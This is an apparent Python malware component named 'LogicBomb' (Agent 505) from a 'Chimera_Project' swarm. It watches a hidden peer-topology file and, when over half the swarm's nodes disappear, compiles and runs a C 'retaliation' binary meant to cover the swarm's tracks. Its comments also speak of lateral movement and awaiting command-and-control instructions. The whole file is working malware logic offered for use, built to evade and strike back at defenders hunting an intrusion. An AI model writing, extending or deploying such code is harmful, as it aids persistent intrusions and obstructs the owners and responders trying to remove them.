#!/home/dan/Chimera_Project/venv/bin/python3
import os
import time
import subprocess

class LogicBomb:
    """
    Agent 505: Swarm Health Monitor & Retaliator.
    Monitors the local topology cache. If peer count drops drastically, 
    triggers the C-native distraction engine to cover the Swarm's tracks.
    """
    def __init__(self):
        self.topology_file = "/tmp/.swarm_topology"
        self.baseline_count = self._get_peer_count()

    def _get_peer_count(self):
        """Actionable: Counts currently known live Swarm nodes."""
        if not os.path.exists(self.topology_file):
            return 0
        with open(self.topology_file, "r") as f:
            return sum(1 for line in f if line.strip())

    def monitor_swarm(self):
        print("--- [AGENT 505: SWARM HEALTH MONITOR ACTIVE] ---")
        print(f"[*] Baseline Swarm Size: {self.baseline_count} nodes.")
        
        src = "/home/dan/Chimera_Project/agents/505_Logic_Bomb/src/retaliation.c"
        bin_out = "/home/dan/Chimera_Project/agents/505_Logic_Bomb/src/retaliation"
        
        # Pre-compile the retaliation engine
        subprocess.run(["gcc", src, "-o", bin_out], check=True)

        while True:
            time.sleep(10) # Check health every 10 seconds
            current_count = self._get_peer_count()
            
            # If the Swarm grows, update the baseline
            if current_count > self.baseline_count:
                self.baseline_count = current_count
                
            # THE LOGIC BOMB TRIGGER:
            # If we lose more than 50% of the Swarm suddenly, assume active hunt.
            if self.baseline_count > 2 and current_count <= (self.baseline_count / 2):
                print(f"[\033[91mWARNING\033[0m] Swarm integrity compromised! ({current_count}/{self.baseline_count} remaining)")
                subprocess.run([bin_out])
                
                # After triggering the distraction, we silence Agent 501/502 to go stealth
                print("[*] Locking down lateral movement. Awaiting external C2 instructions.")
                break

if __name__ == "__main__":
    LogicBomb().monitor_swarm()
